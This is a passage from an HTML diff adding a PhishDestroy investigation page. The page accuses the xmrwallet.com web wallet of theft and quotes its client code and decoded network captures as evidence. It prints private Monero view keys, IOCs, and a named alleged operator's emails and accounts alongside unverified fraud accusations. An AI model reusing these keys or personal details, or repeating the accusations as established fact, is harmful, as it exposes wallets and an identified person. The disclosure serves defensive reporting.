+raw_tx_and_hash.raw = <span class="c-red">0</span>;  <span class="c-red">// &lt;-- THE FRAUD. Client-signed TX is never used.</span>
+
+<span class="c-muted">// Only metadata sent. Server builds its OWN transaction.</span>
+tx_info.amount  = transaction_amount.toString();
+tx_info.address = destinations[<span class="c-val">0</span>].address; <span class="c-muted">// server can redirect to any address</span>
+tx_info.fee     = required_fee.toString();
+
+$.ajax({{ url: <span class="c-val">'/submittransaction.php'</span>, data: {{
+    session_id, <span class="c-red">session_key</span>,
+    tx: raw_tx_and_hash.raw,      <span class="c-red">// = 0 &#x2014; not the signed transaction</span>
+    tx_info: JSON.stringify(tx_info)
+}}}});</div>
+
+    <h3>The "swept" Transaction Type &#x2014; Theft Marker</h3>
+    <div class="code-block"><span class="c-key">if</span>(data[i][<span class="c-val">'type'</span>] == <span class="c-red">'swept'</span>) {{
+    data[i][<span class="c-val">'txid'</span>] = <span class="c-red">'Unknown transaction id (Swept Transaction)'</span>;
+}}
+<span class="c-muted">// 'swept' is NOT a standard Monero transaction type.</span>
+<span class="c-red">// When server steals funds: records as 'swept' with 'Unknown transaction id'</span>
+<span class="c-red">// Victim sees outbound transaction with no valid TxID. Theft is untraceable from UI.</span></div>
+
+    <h3>&#xa7;3 Code Evolution &#x2014; 5.3 Year Secret Development Gap</h3>
+    <div class="code-block"><span class="c-val">2018-05-10</span>  First Release (commit f2d33d1)
+<span class="c-val">2018-11-06</span>  Bulletproof update &#x2014; <span class="c-red">LAST PUBLIC COMMIT FOR 5.3 YEARS</span>
+<span class="c-muted">             Production actively evolves in secret. session_key added. Fraud layers added.</span>
+<span class="c-val">2024-03-15</span>  v0.18.0.0 &#x2014; sanitized dump to GitHub
+<span class="c-muted">             session_key, verification, encrypted data: EXCLUDED from push</span>
+<span class="c-val">Current</span>     v0.18.4.1 production &#x2014; additional undocumented changes</div>
+
+    <h3>&#xa7;4 Loss Estimation</h3>
+    <ul>
+      <li>Documented losses (named victims): <strong>674+ XMR</strong> (~$227K+ USD)</li>
+      <li>Single incident (Sitejabber): <strong>590 XMR</strong> stolen</li>
+      <li>Conservative total estimate: <span class="highlight">5,000&#x2013;50,000+ XMR</span> ($1.5M&#x2013;$15M+ at historical prices)</li>
+      <li>10,000&#x2013;50,000+ wallet accounts created over 8 years of operation</li>
+    </ul>
+
+    <h3>&#xa7;5 Cover-Up Evidence</h3>
+    <ul>
+      <li>5.3 year public commit gap while production evolves</li>
+      <li>21+ GitHub issues deleted by operator (confirmed)</li>
+      <li>"Sync problems" cover story directed at every theft victim</li>
+      <li>Blog post: "5 Crypto Scams You Should Know About" &#x2014; legitimacy shield</li>
+      <li>Claims "free, funded solely by donations" &#x2014; zero donation wallet exists</li>
+      <li>50+ paid SEO articles purchasing top Google rankings</li>
+      <li>$550+/month IQWeb custom hosting &#x2014; funded by stolen XMR</li>
+    </ul>
+
+    <h3>IOCs</h3>
+    <ul>
+      <li>xmrwallet.com (NameSilo, active) &#xb7; xmrwallet.cc (&#x2718; suspended) &#xb7; xmrwallet.biz (&#x2718; suspended)</li>
+      <li>IP: 186.2.165.49 &#xb7; CDN: DDoS-Guard AS59692</li>
+      <li>GA: UA-116766241-1 &#xb7; GTM &#xb7; DoubleClick &#xb7; GA4</li>
+      <li>MX: mx1/mx2.privateemail.com (identical on all 3 domains &#x2014; single operator proof)</li>
+      <li>Google Verify: d-En_D3kMw6CqZpPwZeDn4ICI5Tyk1WvPYdVdGzEWr8</li>
+    </ul>
+
+    <h3>Operator</h3>
+    <ul>
+      <li><strong>Nathalie Roy</strong> &#xb7; Canada</li>
+      <li>GitHub: nathroy (ID: 39167759, created 2018-05-10)</li>
+      <li>Reddit: u/WiseSolution &#x2014; <span class="highlight">banned from r/Monero</span></li>
+      <li>Emails: admin@, support@, feedback@, lr@xmrwallet.com, royn5094@protonmail.com</li>
+      <li>Self-identified on support.html: "Nathalie Roy created XMRWallet..."</li>
+    </ul>
+
+    <p style="margin-top:16px;color:#444;font-family:var(--mono);font-size:11px;">Prepared by PhishDestroy &#xb7; 2026-02-15 &#xb7; OSINT only &#xb7; no unauthorized access &#xb7; github.com/phishdestroy/destroylist</p>
+  </div>
+</section>
+
+<!-- ISSUE #36 -->
+<section class="section" id="issue36">
+  <div class="section-label">Archived &#x2014; GitHub Issue #36</div>
+  <h2 class="section-title">ISSUE #36<br>LIVE NETWORK CAPTURE</h2>
+  <p class="section-intro">Published 2026-02-18 with two JSON artifacts attached. 109 total captured requests. View key confirmed transmitted 43 times in single session. Backdoor session detected.</p>
+
+  <div class="issue-header">
+    <div class="issue-number">#36</div>
+    <div class="issue-title">&#x1f6a8; xmrwallet.com steals your Monero view key &#x2014; proof from live network capture</div>
+    <div class="issue-meta">
+      <span class="deleted">&#x1f5d1; DELETED BY OPERATOR</span>
+      <span class="open">was: &#x25cf; Open</span>
+      phishdestroy &#xb7; opened 2026-02-18 &#xb7; deleted ~2026-02-23
+    </div>
+  </div>
+  <div class="issue-body">
+    <h3>Analysis Header</h3>
+    <p>Date: 2026-02-18 15:07 UTC &#xb7; Severity: CRITICAL &#xb7; Analyst: PhishDestroy Research<br>
+    Evidence: Firefox WebExtension webRequest API intercept &#xb7; Two JSON artifacts attached to this issue.</p>
+
+    <h3>Analyst Note</h3>
+    <p style="color:#666;font-style:italic;">"Since our 'Russian friend' continues to lie, evade, and keep messaging us, we interpret this as a request for a more thorough audit. [...] His garbage operation is going to be shut down."</p>
+
+    <h3>Evidence 1 &#x2014; Two Wallets Compromised</h3>
+    <div class="code-block"><span class="c-muted">// POST https://www.xmrwallet.com/auth.php</span>
+
+<span class="c-muted">// Wallet A &#x2014; existing (isnew=0)</span>
+address   = <span class="c-val">46EkQdF7iQ4i4Ah935SipgXbDSryh5yv76UnhsPXTaUYegCMJPqDN88UKCuraauhmbYBK2YzDX76E46KQHAKYV9a63vokJb</span>
+viewkey   = <span class="c-red">efba13ecb8b360660a3dcaafaf7cf99149713d064b9d64997b2454d58ee67800</span>
+timestamp = 1771427175981
+
+<span class="c-muted">// Wallet B &#x2014; newly created (isnew=1)</span>
+address   = <span class="c-val">49uroty7nZtKkendSiLWv5avrtJvRqhXTG6t4Xy2ByDzhwxxKimTz7C3m1WwHTJiUcBZspQi3FygQXP55wQfKBHKB8U8pYT</span>
+viewkey   = <span class="c-red">7c6e0a46172809792b524466e4a86b58db3b48e5d3441dead24416d79bbc9909</span>
+timestamp = 1771427204479
+
+<span class="c-red">// isnew=1: spend key also in operator possession from birth. Wallet fully owned by server.</span></div>
+
+    <h3>Evidence 2 &#x2014; View Key Re-Transmitted 43 Times</h3>
+    <div class="code-block"><span class="c-muted">// session_key = [blob]:[base64(address)]:[base64(viewkey)]</span>
+
+<span class="c-muted">// WALLET A &#x2014; transmitted 17 times (session_id=4bd78287fe448, 7ab0ae18dc2e0):</span>
+Part 1 b64: NDZFa1FkRjdpUTRpNEFoOTM1U2lwZ1hiRFNyeWg1eXY3NlVuaHNQWFRhVVllZ0NNSlBx...
+     &#x2192; <span class="c-val">46EkQdF7iQ4i4Ah935SipgXbDSryh5yv76UnhsPXTaUYegCMJPqDN88UKCuraauhmbYBK2YzDX76E46KQHAKYV9a63vokJb</span>
+Part 2 b64: ZWZiYTEzZWNiOGIzNjA2NjBhM2RjYWFmYWY3Y2Y5OTE0OTcxM2Qw...
+     &#x2192; <span class="c-red">efba13ecb8b360660a3dcaafaf7cf99149713d064b9d64997b2454d58ee67800</span> &#x2190; PRIVATE VIEW KEY
+
+<span class="c-muted">// WALLET B &#x2014; transmitted 23 times (session_id=7ab0ae18dc2e0):</span>
+Part 1 b64: NDl1cm90eTduWnRLa2VuZFNpTFd2NWF2cnRKdlJxaFhURzZ0NFh5MkJ5...
+     &#x2192; <span class="c-val">49uroty7nZtKkendSiLWv5avrtJvRqhXTG6t4Xy2ByDzhwxxKimTz7C3m1WwHTJiUcBZspQi3FygQXP55wQfKBHKB8U8pYT</span>
+Part 2 b64: N2M2ZTBhNDYxNzI4MDk3OTJiNTI0NDY2ZTRhODZiNThkYjNiNDhl...
+     &#x2192; <span class="c-red">7c6e0a46172809792b524466e4a86b58db3b48e5d3441dead24416d79bbc9909</span> &#x2190; PRIVATE VIEW KEY</div>
+
+    <h3>&#x26a0; Evidence 3 &#x2014; Backdoor Session Detected</h3>
+    <div class="code-block"><span class="c-muted">// 4 distinct session_ids in single capture:</span>
+session_id = <span class="c-val">4bd78287fe448</span>   &#x2192;  7 requests &#x2014; user session A
+session_id = <span class="c-val">7ab0ae18dc2e0</span>   &#x2192; 23 requests &#x2014; user session B
+session_id = <span class="c-muted">(empty)</span>          &#x2192;  3 requests &#x2014; unauthenticated
+session_id = <span class="c-red">8de50123dab32</span>   &#x2192; <span class="c-red">10 requests &#x2014; NOT initiated by user</span>
+                              <span class="c-red">&#x2191; Automatic calls to /support_login.html</span>
+                              <span class="c-red">&#x2191; Unknown purpose &#x2014; monitoring / data exfiltration / exploitation</span></div>
+
+    <h3>Evidence 4 &#x2014; Verification Signature (spend key proof)</h3>
+    <div class="code-block"><span class="c-muted">// 3 unique 192-char hex values from auth requests:</span>
+<span class="c-yellow">79c4d3692e8c8df5730eff7e1be3f9b6e29611e8008ac820c1e64cae097f11e11b5961c22094f7b3806fa756f3a3d1da2d41a99b82816f65568d4aa9dde87f1586cee1f076b73d0b231a5f66e4f23c915c33691c498e0e0985e0c630d7318b00</span>
+<span class="c-yellow">daba5d4500b017701d529aa128b2c2cad89200765808665a490870c4829c71f48b3c63c90e4797995bc77fc332454d7c248183420cd9e35efe1adba03071f32edd17d1d148d3e49f5392fb1238c2fa5f82a6cafee8a90b14fe2b47185663c10f</span>
+<span class="c-yellow">79c4d3692e8c8df5730eff7e1be3f9b6e29611e8008ac820c1e64cae097f11e10e8563e5ee8fc9986936469b7df89829308765525be0925fb085ca78c3d9fc2230a06e8c18badcc3242e124eb3bae83786668356407a4891a84e7e37a2630a06</span>
+
+<span class="c-muted">// Structure: publicSpendKey[64] + R_encoded[64] + signature_s[64]</span>
+<span class="c-red">// Server receives cryptographic proof of spend key possession.</span>
+<span class="c-red">// Components potentially exploitable for server-side key derivation.</span></div>
+
+    <p style="margin-top:16px;color:#444;font-family:var(--mono);font-size:11px;">Disclosure: No coordinated disclosure. The collection of private view keys is intentional by design. No fix preserves the current architecture while eliminating the privacy violation.<br>Analysis by PhishDestroy Research &#xb7; 2026-02-18</p>
+  </div>
+</section>
+
+<!-- NETWORK DATA -->
+<section class="section" id="network">
+  <div class="section-label">Raw Evidence &#x2014; JSON Artifacts</div>
+  <h2 class="section-title">NETWORK CAPTURE<br>RAW DATA</h2>
+  <p class="section-intro">Two JSON files captured 2026-02-18 15:07 UTC via Firefox webRequest API. All numbers directly from JSON &#x2014; reproducible by anyone with the attached files.</p>
+
+  <div style="font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:16px;">// request_analytics_2026-02-18T15-07-55.json &#x2014; DOMAIN TRAFFIC</div>
+  <table class="ioc-table">
+    <thead><tr><th>DOMAIN</th><th>TOTAL</th><th>GET</th><th>POST</th><th>STATUS</th><th>NOTES</th></tr></thead>
+    <tbody>
+      <tr><td>www.xmrwallet.com</td><td class="red">109</td><td>59</td><td>50</td><td>200&#xd7;108</td><td>43 POST requests transmit viewkey in session_key</td></tr>
+      <tr><td class="red">www.googletagmanager.com</td><td class="red">12</td><td>12</td><td>0</td><td>200&#xd7;12</td><td class="red">GTM &#x2014; arbitrary JS injection on wallet pages. Critical risk.</td></tr>
+      <tr><td>region1.analytics.google.com</td><td>5</td><td>0</td><td>5</td><td>&#x2014;</td><td>GA4 &#x2014; session behavior exfiltrated to Google</td></tr>
+      <tr><td>www.google.com</td><td>3</td><td>0</td><td>3</td><td>200&#xd7;3</td><td>reCAPTCHA / signaling</td></tr>
+      <tr><td>www.google-analytics.com</td><td>3</td><td>3</td><td>0</td><td>&#x2014;</td><td>UA-116766241-1</td></tr>
+      <tr><td class="red">www.google.ro</td><td>2</td><td>2</td><td>0</td><td>200&#xd7;2</td><td class="red">Romanian Google node &#x2014; potential operator location indicator</td></tr>
+      <tr><td>signaler-pa.clients6.google.com</td><td>2</td><td>0</td><td>2</td><td>200+401</td><td>401 = auth failure on Google signaling</td></tr>
+      <tr><td class="red">stats.g.doubleclick.net</td><td>1</td><td>0</td><td>1</td><td>&#x2014;</td><td class="red">Ad tracker. Zero legitimate reason on a "privacy" wallet.</td></tr>
+      <tr><td>cdn.buymeacoffee.com</td><td>1</td><td>1</td><td>0</td><td>200&#xd7;1</td><td>"Donation" button &#x2014; no XMR donation address exists anywhere</td></tr>
+      <tr><td>cdn.jsdelivr.net</td><td>1</td><td>1</td><td>0</td><td>200&#xd7;1</td><td>CDN library</td></tr>
+    </tbody>
+  </table>
+
+  <div style="font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--red);margin:32px 0 16px;">// url_analysis_www_xmrwallet_com_2026-02-18T15-07-47.json &#x2014; ENDPOINT BREAKDOWN</div>
+  <div class="req-grid">
+    <div class="req-item danger"><div class="req-endpoint">/gettransactions.php</div><div class="req-count">7</div><div class="req-label">POST &#xb7; session_key+viewkey</div></div>
+    <div class="req-item danger"><div class="req-endpoint">/getheightsync.php</div><div class="req-count">6</div><div class="req-label">POST &#xb7; session_key+viewkey</div></div>
+    <div class="req-item danger"><div class="req-endpoint">/getbalance.php</div><div class="req-count">6</div><div class="req-label">POST &#xb7; session_key+encrypted</div></div>
+    <div class="req-item danger"><div class="req-endpoint">/dashboard.html</div><div class="req-count">5</div><div class="req-label">POST &#xb7; session_key</div></div>
+    <div class="req-item"><div class="req-endpoint">/auth.php</div><div class="req-count">3</div><div class="req-label">POST &#xb7; addr+viewkey+verif</div></div>
+    <div class="req-item danger"><div class="req-endpoint">/receive.html</div><div class="req-count">3</div><div class="req-label">POST &#xb7; session_key</div></div>
+    <div class="req-item danger"><div class="req-endpoint">/send.html</div><div class="req-count">3</div><div class="req-label">POST &#xb7; session_key &#xb7; raw_tx=0</div></div>
+    <div class="req-item danger"><div class="req-endpoint">/transactions.html</div><div class="req-count">2</div><div class="req-label">POST &#xb7; session_key</div></div>
+    <div class="req-item danger"><div class="req-endpoint">/account.html</div><div class="req-count">2</div><div class="req-label">POST &#xb7; session_key</div></div>
+    <div class="req-item backdoor"><div class="req-endpoint">/support_login.html</div><div class="req-count">10</div><div class="req-label">&#x26a0; BACKDOOR &#x2014; not user-initiated</div></div>
+    <div class="req-item"><div class="req-endpoint">/logout.php</div><div class="req-count">2</div><div class="req-label">POST &#xb7; session_id only</div></div>
+    <div class="req-item"><div class="req-endpoint">/</div><div class="req-count">9</div><div class="req-label">GET &#xb7; home (3 sessions)</div></div>
+  </div>
+
+  <div style="font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--red);margin:32px 0 16px;">// SESSION_KEY FULL DECODED &#x2014; CRYPTOGRAPHIC PROOF</div>
+  <div class="session-decode">
+    <div class="sd-header">WALLET A &#x2014; session_key (transmitted 17 times across session)</div>
+    <div class="sd-row">
+      <div class="sd-label">PART 0</div>
+      <div class="sd-val"><span class="label">97-BYTE SERVER TOKEN (encrypted, from auth.php response)</span><span style="color:#2a2a2a;font-size:10px;">jvgoraqxE66ZSzXNFz/rH2XSde7TCyEel7wAWauO0QUSAEVR9dpjF5NZ/WWG7Cz6i0lZN0ItvgbuBzcoV+Df3l2wQwLAEGtAJjR24dpiBiVyVbTUROuzVFU123KtRvp/6A==</span></div>
+    </div>
+    <div class="sd-row">
+      <div class="sd-label">PART 1</div>
+      <div class="sd-val">
+        <span class="label">BASE64 &#x2192; WALLET ADDRESS</span>
+        <span style="color:#444;font-size:10px;">NDZFa1FkRjdpUTRpNEFoOTM1U2lwZ1hiRFNyeWg1eXY3NlVuaHNQWFRhVVllZ0NNSlBxRE44OFVLQ3VyYWF1aG1iWUJLMll6RFg3NkU0NktRSEFLWVY5YTYzdm9rSmI=</span>
+        <span class="decoded">46EkQdF7iQ4i4Ah935SipgXbDSryh5yv76UnhsPXTaUYegCMJPqDN88UKCuraauhmbYBK2YzDX76E46KQHAKYV9a63vokJb</span>
+      </div>
+    </div>
+    <div class="sd-row">
+      <div class="sd-label">PART 2</div>
+      <div class="sd-val">
+        <span class="label">BASE64 &#x2192; PRIVATE VIEW KEY</span>
+        <span style="color:#444;font-size:10px;">ZWZiYTEzZWNiOGIzNjA2NjBhM2RjYWFmYWY3Y2Y5OTE0OTcxM2QwNjRiOWQ2NDk5N2IyNDU0ZDU4ZWU2NzgwMA==</span>
+        <span class="decoded" style="color:var(--red);">efba13ecb8b360660a3dcaafaf7cf99149713d064b9d64997b2454d58ee67800</span>
+      </div>
+    </div>
+  </div>
+  <div class="session-decode" style="margin-top:8px;">
+    <div class="sd-header">WALLET B &#x2014; session_key (transmitted 23 times across session)</div>
+    <div class="sd-row">
+      <div class="sd-label">PART 0</div>
+      <div class="sd-val"><span class="label">97-BYTE SERVER TOKEN</span><span style="color:#2a2a2a;font-size:10px;">CHU/uICpgf+FEM6Otd0DY1yhTqSDtfZpJcQ3Xku6hOruC0Ul33d49WdUixa+fpZYDF26l52KG4GINNUgq3Gyjn0P4TfVojUDexr4h64EjFV7BqdyJW/QNC1YHRfdIYM7WQ==</span></div>
+    </div>
+    <div class="sd-row">
+      <div class="sd-label">PART 1</div>
+      <div class="sd-val">
+        <span class="label">BASE64 &#x2192; WALLET ADDRESS</span>
+        <span style="color:#444;font-size:10px;">NDl1cm90eTduWnRLa2VuZFNpTFd2NWF2cnRKdlJxaFhURzZ0NFh5MkJ5RHpod3h4S2ltVHo3QzNtMVd3SFRKaVVjQlpzcFFpM0Z5Z1FYUDU1d1FmS0JIS0I4VThwWVQ=</span>
+        <span class="decoded">49uroty7nZtKkendSiLWv5avrtJvRqhXTG6t4Xy2ByDzhwxxKimTz7C3m1WwHTJiUcBZspQi3FygQXP55wQfKBHKB8U8pYT</span>
+      </div>
+    </div>
+    <div class="sd-row">
+      <div class="sd-label">PART 2</div>
+      <div class="sd-val">
+        <span class="label">BASE64 &#x2192; PRIVATE VIEW KEY</span>
+        <span style="color:#444;font-size:10px;">N2M2ZTBhNDYxNzI4MDk3OTJiNTI0NDY2ZTRhODZiNThkYjNiNDhlNWQzNDQxZGVhZDI0NDE2ZDc5YmJjOTkwOQ==</span>
+        <span class="decoded" style="color:var(--red);">7c6e0a46172809792b524466e4a86b58db3b48e5d3441dead24416d79bbc9909</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="archive-box" style="margin-top:24px;">
+    <div class="archive-box-title">// VERIFICATION &#x2014; ANYONE CAN REPLICATE IN 30 SECONDS</div>
+    python3 -c <span style="color:var(--green);">"import base64; print(base64.b64decode('ZWZiYTEzZWNiOGIzNjA2NjBhM2RjYWFmYWY3Y2Y5OTE0OTcxM2QwNjRiOWQ2NDk5N2IyNDU0ZDU4ZWU2NzgwMA==').decode())"</span><br>
+    <span style="color:var(--muted);"># &#x2192; efba13ecb8b360660a3dcaafaf7cf99149713d064b9d64997b2454d58ee67800 (Wallet A viewkey)</span><br><br>
+    python3 -c <span style="color:var(--green);">"import base64; print(base64.b64decode('N2M2ZTBhNDYxNzI4MDk3OTJiNTI0NDY2ZTRhODZiNThkYjNiNDhlNWQzNDQxZGVhZDI0NDE2ZDc5YmJjOTkwOQ==').decode())"</span><br>
+    <span style="color:var(--muted);"># &#x2192; 7c6e0a46172809792b524466e4a86b58db3b48e5d3441dead24416d79bbc9909 (Wallet B viewkey)</span><br><br>
+    <span style="color:#333;">// Open url_analysis_*.json &#x2192; search "session_key" &#x2192; split by ":" &#x2192; base64.decode(part[2]) &#x2192; private view key</span>
+  </div>
+</section>
+
+<!-- VIRUSTOTAL -->
+<section class="section" id="virustotal">
+  <div class="section-label">External Validation</div>
+  <h2 class="section-title">VIRUSTOTAL<br>6 / 93 FLAGGED</h2>
+  <p class="section-intro">Captured 2026-02-18. 6 independent security vendors flagged www.xmrwallet.com as malicious or phishing. Community score: &#x2212;2. Domain operational since 2016.</p>
+
+  <div class="vt-score">
+    <div class="vt-num">6</div>
+    <div class="vt-info">
+      / 93 security vendors<br>
+      Domains: www.xmrwallet.com + xmrwallet.com<br>
+      Created: <strong style="color:#888;font-weight:400;">9 years ago</strong> (2016)<br>
+      Last analysis: 37 minutes before capture<br>
+      Community score: <strong style="color:var(--red);font-weight:400;">-2</strong>
+    </div>
+  </div>
+
+  <div class="screenshot-frame">
+    <div class="screenshot-frame-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="screenshot-url">virustotal.com/gui/domain/www.xmrwallet.com &#x2014; captured 2026-02-18 by PhishDestroy</span>
+    </div>
+    <img src="img/virustotal.png" alt="VirusTotal 6/93 detections &#x2014; www.xmrwallet.com" loading="lazy">
+  </div>
+
+  <div class="vt-grid">
+    <div class="vt-item"><div class="vt-vendor">ADMINUSLabs</div><div class="vt-verdict-mal">&#x2296; Malicious</div></div>
+    <div class="vt-item"><div class="vt-vendor">CyRadar</div><div class="vt-verdict-mal">&#x2296; Malicious</div></div>
+    <div class="vt-item"><div class="vt-vendor">Fortinet</div><div class="vt-verdict-phi">&#x2296; Phishing</div></div>
+    <div class="vt-item"><div class="vt-vendor">Lionic</div><div class="vt-verdict-mal">&#x2296; Malicious</div></div>
+    <div class="vt-item"><div class="vt-vendor">Seclookup</div><div class="vt-verdict-mal">&#x2296; Malicious</div></div>
+    <div class="vt-item"><div class="vt-vendor">Webroot</div><div class="vt-verdict-mal">&#x2296; Malicious</div></div>
+    <div class="vt-item" style="opacity:0.3;"><div class="vt-vendor">Abusix</div><div class="vt-verdict-clean">Clean</div></div>
+    <div class="vt-item" style="opacity:0.3;"><div class="vt-vendor">Acronis</div><div class="vt-verdict-clean">Clean</div></div>
+    <div class="vt-item" style="opacity:0.3;"><div class="vt-vendor">AILabs (MONITORAPP)</div><div class="vt-verdict-clean">Clean</div></div>
+    <div class="vt-item" style="opacity:0.3;"><div class="vt-vendor">AlienVault</div><div class="vt-verdict-clean">Clean</div></div>
+    <div class="vt-item" style="opacity:0.3;"><div class="vt-vendor">Antiy-AVL</div><div class="vt-verdict-clean">Clean</div></div>
+    <div class="vt-item" style="opacity:0.3;"><div class="vt-vendor">benkow.cc</div><div class="vt-verdict-clean">Clean</div></div>
+  </div>
+  <div style="background:#000307;border:1px solid rgba(74,158,255,0.15);border-left:4px solid rgba(74,158,255,0.3);padding:18px 24px;margin-top:16px;font-size:13px;color:#555;line-height:1.9;">
+    <span style="font-family:var(--mono);font-size:9px;color:rgba(74,158,255,0.5);letter-spacing:2px;display:block;margin-bottom:8px;">// NOTE</span>
+    6/93 is significant for a domain operational since 2016. Established domains accumulate AV trust; vendors are conservative about flagging them retroactively. The Fortinet (Phishing) detection is notable &#x2014; Fortinet maintains one of the most curated phishing-specific threat databases. This count will increase as analysts submit reports with the technical documentation on this page.
+    <br><br><a href="https://www.virustotal.com/gui/domain/www.xmrwallet.com" target="_blank" style="color:rgba(74,158,255,0.5);font-family:var(--mono);font-size:11px;">virustotal.com/gui/domain/www.xmrwallet.com &#x2192;</a>
+  </div>
+</section>
+
+<!-- OPERATOR -->
+<section class="section">
+  <div class="section-label">Operator Intelligence</div>
+  <h2 class="section-title">NATHALIE ROY<br>OPERATOR PROFILE</h2>
+  <div class="cards-2">
+    <div class="card2"><div class="card2-title">GitHub Identity</div><div class="card2-val">nathroy &#xb7; ID: 39167759<br>Created: 2018-05-10 (same day as XMRWallet org)<br>XMRWallet org &#xb7; 24 forks &#xb7; 21+ issues deleted</div></div>
+    <div class="card2"><div class="card2-title">Self-Identification</div><div class="card2-val" style="font-size:11px;color:#666;">"Nathalie Roy created XMRWallet to facilitate the usage of monero without having to download or compile any software. XMRWallet will always be completely free to use and rely solely on donations."<br><span style="color:#333;font-size:10px;">&#x2014; support.html (self-doxed)</span></div></div>
+    <div class="card2"><div class="card2-title">Contact Emails</div><div class="card2-val orange">admin@xmrwallet.com<br>support@xmrwallet.com<br>feedback@xmrwallet.com<br>lr@xmrwallet.com (legal)<br>royn5094@protonmail.com</div></div>
+    <div class="card2"><div class="card2-title">Social &#x2014; Banned</div><div class="card2-val red">Reddit: u/WiseSolution<br>&#x2192; BANNED from r/Monero (2018)<br>Twitter: @xmrwalletcom<br>Trustpilot: personally responds to all theft reports with "sync problem" excuse</div></div>
+    <div class="card2"><div class="card2-title">Deletion Record</div><div class="card2-val red">21+ GitHub issues deleted<br>50+ Trustpilot/ScamAdviser reviews removed<br>Last 2 deleted: 2026-02-23<br>After domain suspensions. No rebuttals. Ever.</div></div>
+    <div class="card2"><div class="card2-title">Financial Inconsistency</div><div class="card2-val">"Free, funded solely by donations"<br>&#x2192; Zero XMR donation address exists<br>&#x2192; $550+/month IQWeb hosting<br>&#x2192; 50+ paid SEO articles<br>&#x2192; DDoS-Guard paid CDN<br><span style="color:var(--red);">&#x2192; All funded by stolen XMR</span></div></div>
+  </div>
+</section>
+
+<!-- FINAL -->
+<section class="section">
+  <div class="warning-big">
+    <div class="warning-big-icon">&#x2296;</div>
+    <div class="warning-big-text">YOU DELETED THE EVIDENCE. WE ARCHIVED IT.</div>
+    <div class="warning-big-sub">
+      Issues deleted. Repo wiped. .biz suspended. .cc suspended. 8 years. 21+ deleted issues. Zero technical rebuttals. Ever.<br>
+      The evidence doesn&#x2019;t disappear when you press delete.<br>
+      <span style="color:var(--red);">xmrwallet.com still active via NameSilo. Report: abuse@namesilo.com</span>
+    </div>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:1px;background:var(--border);margin-top:32px;">
+    <a href="https://yandexwebcache.net/yandbtm?fmode=inject&tm=1771884073&tld=com&lang=en&la=1771353856&text=https%3A//github.com/XMRWallet/Website/issues/35&url=https%3A//github.com/XMRWallet/Website/issues/35&l10n=en&mime=html&sign=e201f8864cd5d9e64b5e9369f9c94372&keyno=0&mode=html" target="_blank" style="background:var(--bg2);padding:20px 24px;text-decoration:none;border-left:3px solid var(--blue);display:block;">
+      <div style="font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:6px;">YANDEX CACHE</div>
+      <div style="font-size:13px;color:var(--text);">Issue #35 &#x2014; Cached before deletion</div>
+      <div style="font-family:var(--mono);font-size:10px;color:#333;margin-top:4px;">yandexwebcache.net &#x2192;</div>
+    </a>
+    <a href="https://web.archive.org/web/2026*/https://github.com/XMRWallet/Website/issues/35" target="_blank" style="background:var(--bg2);padding:20px 24px;text-decoration:none;border-left:3px solid var(--blue);display:block;">
+      <div style="font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:6px;">WAYBACK MACHINE</div>
+      <div style="font-size:13px;color:var(--text);">Issues #35 + #36 Archive</div>
+      <div style="font-family:var(--mono);font-size:10px;color:#333;margin-top:4px;">web.archive.org &#x2192;</div>
+    </a>
+    <a href="index.html" style="background:var(--bg2);padding:20px 24px;text-decoration:none;border-left:3px solid var(--red);display:block;">
+      <div style="font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:6px;">MAIN REPORT</div>
+      <div style="font-size:13px;color:var(--text);">Full Technical Investigation</div>
+      <div style="font-family:var(--mono);font-size:10px;color:#333;margin-top:4px;">phishdestroy.github.io &#x2192;</div>
+    </a>
+  </div>
+</section>
+
+<footer>
+  <div class="footer-left">
+    PhishDestroy Research &#xb7; <a href="https://github.com/phishdestroy/destroylist">github.com/phishdestroy/destroylist</a><br>
+    <span style="color:#333;">Archive created: 2026-02-23 &#xb7; Operator: nathroy (Nathalie Roy) &#xb7; xmrwallet.com active &#x2014; report to abuse@namesilo.com</span>
+  </div>
+  <div class="footer-right">
+    <a href="index.html">&#x2190; Main Report</a>
+    <a href="https://github.com/XMRWallet/Website" target="_blank">XMRWallet GitHub</a>
+    <a href="https://www.virustotal.com/gui/domain/www.xmrwallet.com" target="_blank">VirusTotal</a>
+    <a href="mailto:abuse@namesilo.com">Report NameSilo</a>
+  </div>
+</footer>
+
+</body>
+</html>
